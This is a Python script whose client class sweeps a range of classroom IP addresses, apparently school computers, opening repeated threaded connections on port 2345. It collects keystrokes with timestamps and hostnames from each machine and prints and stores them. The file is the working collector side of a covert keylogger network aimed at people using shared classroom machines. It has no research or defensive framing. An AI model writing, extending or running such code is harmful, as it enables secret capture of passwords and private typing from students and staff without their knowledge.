import time
import threading
import socket
import json

# DEFAULT_CLASSROOM = "201"
# PORT = "2345"
# CHECK_CONN_HOST_INTERVAL = 0.3

class Client:

    def __init__(self, classroom, port, check_interval):

        self.classroom = classroom
        self.port = port
        self.check_interval = check_interval
        self.classroom_ips = self.generate_ip_for_classroom()

        self.is_running = True
        self.keys = {}
        self.hosts_connected_name = {}

    def generate_ip_for_classroom(self) -> list[str]:
        """
         Generate a list of IPs for the classroom. Start at 10.205.{classroom}.100 to 10.205.{classroom}.251

         Returns: 
         	 A list of IP addresses in dotted decimal format ( 10. 205. { classroom }. { i + 100 } )
        """
        return [f"10.205.{self.classroom}.{i+100}" for i in range(1, 151)]


    def recv_host_key(self, s:socket.socket, host:str):
        """
         Receive host key from socket and add to list of keys in a loop as long as the host is connected

         todo : add timeout to revc so the programm can close (dont block until it receive)

         Args:
         	 s: socket to recieve data from. This is used to create a list of keys
         	 host: host to which the key is connected. This is used to determine the key type

         Returns: 
         	 None if everything went fine error message if something went wrong
        """

        while self.is_running: # main loop
            try:
                data = s.recv(1024) # {'hostname': 'SIOP0201-EDU-11', 'keys': [{'key': 'maj', 'time': 1694068657.8892527}]}
            except socket.error:
                return f"Connection timed out by {host} 💥"

            if not data:
                return f"Connection closed by {host} 🚧"

            try:
                data_json = json.loads(data.decode("utf-8"))
            except json.JSONDecodeError: # the keys on the server are longer than 1024 characters
                print(f"can't decode : {data.decode('utf-8')}")

            hostname = data_json.get("hostname")

            self.hosts_connected_name[host]["hostname"] = hostname

            # create new list of keys for this host or append to existing list
            self.keys.setdefault(hostname, []).extend(data_json.get("keys"))

            print(f"{hostname} > {''.join([k['key'] for k in data_json.get('keys')])}")


    def conn_host(self, host:str):
        """
         Connect to a host and receive keystrokes from it.

         Args:
         	 host: The host to connect to

        """

        if host in self.hosts_connected_name: return # if the host is already connected, don't reconnect to it


        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1) # so it don't try to connect for too long

            try: s.connect((host, self.port))

            except socket.timeout: return # if you can't connect just return

            s.settimeout(None) # so it cant wait until it receives data

            # New connection
            print(f"New connection to {host} 🛫")
            self.hosts_connected_name[host] = {"hostname" : None, "component" : None}

            self.recv_host_key(s, host)

        self.hosts_connected_name.pop(host) if host in self.hosts_connected_name.keys() else None


    def try_to_connect_to_classroom(self):
        """
         Try to connect to every host in the classroom.
        """
        for ip in self.classroom_ips:
            threading.Thread(target=self.conn_host, args=(ip,)).start()


    def try_to_connect_to_classroom_for_ever(self):
        """
         Try to connect to classroom for ever. This is a long running function that will wait self.check_interval between attempts
        """

        while self.is_running:
            self.try_to_connect_to_classroom()

            time.sleep(self.check_interval)


if __name__ == "__main__":
    c = Client("201", 2345, 0.3)
    c.try_to_connect_to_classroom_for_ever()